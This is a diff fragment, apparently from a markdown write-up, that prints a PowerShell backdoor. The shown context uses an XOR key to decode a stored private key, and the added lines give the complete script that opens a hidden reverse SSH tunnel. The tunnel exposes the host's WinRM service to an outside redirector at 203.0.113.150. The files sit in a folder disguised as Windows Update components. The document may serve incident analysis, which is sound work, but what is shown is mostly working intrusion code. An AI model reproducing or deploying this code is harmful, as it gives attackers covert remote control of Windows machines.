@@ -37,6 +37,74 @@ function _d([string]$a,[byte[]]$b){$c=[Convert]::FromBase64String(($a-replace'\s
 $k=@(99,111,117,110,116,101,114,115,116,114,105,107,101)
 $p=_d (Get-Content -LiteralPath (Join-Path $PSScriptRoot 'pk.dat') -Raw) $k
 & (Join-Path $PSScriptRoot 'Inner-ReverseTunnel.ps1') -KeyPath $p -RedirectorHost '203.0.113.150' -RedirectorUser 'accesscheck' -RemotePort 55985 -LocalWinRMPort 5985 -SessionMinutes 20
+
+PS C:\Users\Administrator> gci C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime\
+
+
+    Directory: C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         4/13/2026   8:45 AM           1602 Inner-ReverseTunnel.ps1
+-a----         4/13/2026   8:49 AM            578 Invoke-WuModule.ps1
+-a----         4/13/2026   8:49 AM             76 pk.dat
+
+param(
+    [Parameter(Mandatory = $true)]
+    [string]$KeyPath,
+    [string]$SshExe = "$env:WINDIR\System32\OpenSSH\ssh.exe",
+    [string]$RedirectorHost = "203.0.113.150",
+    [string]$RedirectorUser = "accesscheck",
+    [string]$KnownHostsPath = "",
+    [int]$RemotePort = 55985,
+    [int]$LocalWinRMPort = 5985,
+    [int]$SessionMinutes = 20
+)
+
+$ErrorActionPreference = "Stop"
+
+$keyParent = Split-Path -Parent $KeyPath
+if (-not $KnownHostsPath) { $KnownHostsPath = Join-Path $keyParent "known_hosts" }
+
+if (-not (Test-Path $SshExe)) { throw "ssh.exe not found at $SshExe" }
+if (-not (Test-Path $KeyPath)) { throw "Private key not found at $KeyPath" }
+
+$knownHostsParent = Split-Path -Path $KnownHostsPath -Parent
+if (-not (Test-Path $knownHostsParent)) {
+    New-Item -ItemType Directory -Path $knownHostsParent -Force | Out-Null
+}
+
+$reverseSpec = "127.0.0.1:{0}:127.0.0.1:{1}" -f $RemotePort, $LocalWinRMPort
+$baseArgs = @(
+    "-i", $KeyPath,
+    "-o", "BatchMode=yes",
+    "-o", "StrictHostKeyChecking=accept-new",
+    "-o", "UserKnownHostsFile=$KnownHostsPath",
+    "-o", "ServerAliveInterval=30",
+    "-o", "ServerAliveCountMax=2",
+    "-o", "ConnectTimeout=20",
+    "-o", "ExitOnForwardFailure=yes",
+    "-N",
+    "-R", $reverseSpec,
+    "${RedirectorUser}@${RedirectorHost}"
+)
+
+$sshProc = Start-Process -FilePath $SshExe -ArgumentList $baseArgs -PassThru -WindowStyle Hidden
+
+Start-Sleep -Seconds 8
+
+if ($sshProc.HasExited) {
+    exit 1
+}
+
+Start-Sleep -Seconds ($SessionMinutes * 60)
+
+if (-not $sshProc.HasExited) {
+    Stop-Process -Id $sshProc.Id -Force
+    Start-Sleep -Seconds 2
+}
+exit 0
 ```
 
 $k=counterstrike
